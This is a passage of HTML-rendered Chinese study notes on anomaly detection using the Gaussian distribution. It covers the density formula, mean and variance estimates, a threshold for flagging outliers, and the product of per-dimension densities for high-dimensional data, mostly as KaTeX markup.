encoding=\"application/x-tex\">+\\infty</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6667em;vertical-align:-0.0833em;\"></span><span class=\"mord\">+</span><span class=\"mord\">∞</span></span></span></span> 的概率密度函数的积分是 1。</li>\n</ol>\n<blockquote>\n<p>高斯分布</p>\n</blockquote>\n<p>高斯分布的概率密度函数是：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi>σ</mi><msqrt><mrow><mn>2</mn><mi>π</mi></mrow></msqrt></mrow></mfrac><msup><mi>e</mi><mrow><mo>−</mo><mfrac><mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo>−</mo><mi>μ</mi><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msup><mi>σ</mi><mn>2</mn></msup></mrow></mfrac></mrow></msup></mrow><annotation encoding=\"application/x-tex\">p(x)=\\frac1{\\sigma\\sqrt{2\\pi}}e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.2591em;vertical-align:-0.93em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3214em;\"><span style=\"top:-2.2028em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9072em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\" style=\"padding-left:0.833em;\"><span class=\"mord\">2</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">π</span></span></span><span style=\"top:-2.8672em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg xmlns=\"http://www.w3.org/2000/svg\" width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1328em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3291em;\"><span style=\"top:-3.4534em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\"><span class=\"mopen nulldelimiter sizing reset-size3 size6\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.251em;\"><span style=\"top:-2.5062em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9384em;\"><span style=\"top:-2.9384em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6444em;\"></span><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.2255em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line mtight\" style=\"border-bottom-width:0.049em;\"></span></span><span style=\"top:-3.5021em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mbin mtight\">−</span><span class=\"mord mathnormal mtight\">μ</span><span class=\"mclose mtight\"><span class=\"mclose mtight\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0484em;\"><span style=\"top:-3.0484em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6444em;\"></span><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4938em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter sizing reset-size3 size6\"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>μ</mi></mrow><annotation encoding=\"application/x-tex\">\\mu</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">μ</span></span></span></span> 为数据均值，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>σ</mi></mrow><annotation encoding=\"application/x-tex\">\\sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span></span></span></span> 为标准差（大 / 小 =&gt; 数据分布离散 / 集中）：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>μ</mi><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><msup><mi>x</mi><mrow><mo stretchy=\"false\">(</mo><mi>i</mi><mo stretchy=\"false\">)</mo></mrow></msup></mrow><annotation encoding=\"application/x-tex\">\\mu=\\frac{1}{m}\\sum_{i=1}^{m}x^{(i)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">μ</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.233em;vertical-align:-0.345em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8451em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.345em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8043em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2997em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.888em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span></span></span></span>；<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>σ</mi><mn>2</mn></msup><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><mo stretchy=\"false\">(</mo><msup><mi>x</mi><mrow><mo stretchy=\"false\">(</mo><mi>i</mi><mo stretchy=\"false\">)</mo></mrow></msup><mo>−</mo><mi>μ</mi><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">\\sigma^2=\\frac{1}{m}\\sum_{i=1}^{m}(x^{(i)}-\\mu)^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.233em;vertical-align:-0.345em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8451em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.345em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8043em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2997em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.888em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0641em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">μ</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706430803/Typera/2024/01/16504d63b5821211ed55826583950a8e.png\" alt=\"image-20240128163314972\" /></p>\n<blockquote>\n<p>基于高斯分布实现异常检测</p>\n</blockquote>\n<p>数据是<strong>一维</strong>的情况：（简单理解）<br />\n有一维数据：$$\\begin {Bmatrix} x_1,x_2,\\dots,x_m\\end {Bmatrix}$$；共 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 个数据样本</p>\n<ol>\n<li>\n<p>计算数据的均值 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>μ</mi></mrow><annotation encoding=\"application/x-tex\">\\mu</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">μ</span></span></span></span>，标准差 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>σ</mi></mrow><annotation encoding=\"application/x-tex\">\\sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span></span></span></span></p>\n</li>\n<li>\n<p>计算对应的高斯分布概率密度函数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span></p>\n</li>\n<li>\n<p>根据数据的概率密度值，进行判断：<br />\n如果 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo>&lt;</mo><mi>ε</mi></mrow><annotation encoding=\"application/x-tex\">p(x_i)&lt;\\varepsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">ε</span></span></span></span> ：则 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 为异常点</p>\n</li>\n</ol>\n<p>数据是<strong>高维</strong>的情况：<br />\n有高维数据：$$\\begin<ruby>Bmatrix}x_1<rp>(</rp><rt>{(1)</rt><rp>)</rp></ruby>,x_1^<ruby>(2)},\\dots, x_1<rp>(</rp><rt>{(m)</rt><rp>)</rp></ruby>\\\\dots\\x_n<sup (m)=\"\">{(1)},x_n^{(2)},\\dots,x_n</sup>\\end {Bmatrix}$$；共 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 维，每维有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 个数据样本。</p>\n<ol>\n<li>\n<p>计算每个维度的数据均值 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>μ</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>μ</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>μ</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\mu_1,\\mu_2,...,\\mu_n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">μ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">μ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">...</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">μ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，标准差<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>σ</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>σ</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>σ</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\sigma_1,\\sigma_2,...,\\sigma_n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">...</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></p>\n\\begin{array}\n&\\mu_j={\\frac{1}{m}\\sum_{i=1}^mx_j^{(i)}},&&&\\sigma_{j}^{2}=\\frac{1}{m}\\sum_{i=1}^{m}(x_{j}^{(i)}-\\mu_{j})^{2}&\n\\end{array}\n\n</li>\n<li>\n<p>计算概率密度函数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span>：<br />\n分别计算每个维度下的高斯分布概率密度函数， 然后将结果相乘</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><munderover><mo>∏</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>j</mi></msub><mo stretchy=\"false\">)</mo><mo>=</mo><munderover><mo>∏</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mfrac><mn>1</mn><mrow><msub><mi>σ</mi><mi>j</mi></msub><msqrt><mrow><mn>2</mn><mi>π</mi></mrow></msqrt></mrow></mfrac><msup><mi>e</mi><mrow><mo>−</mo><mfrac><mrow><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>j</mi></msub><mo>−</mo><msub><mi>μ</mi><mi>j</mi></msub><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msubsup><mi>σ</mi><mi>j</mi><mn>2</mn></msubsup></mrow></mfrac></mrow></msup></mrow><annotation encoding=\"application/x-tex\">p(x)=\\prod_{j=1}^np(x_j)=\\prod_{j=1}^n\\frac1{\\sigma_j\\sqrt{2\\pi}}e^{-\\frac{(x_j-\\mu_j)^2}{2\\sigma_j^2}}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" 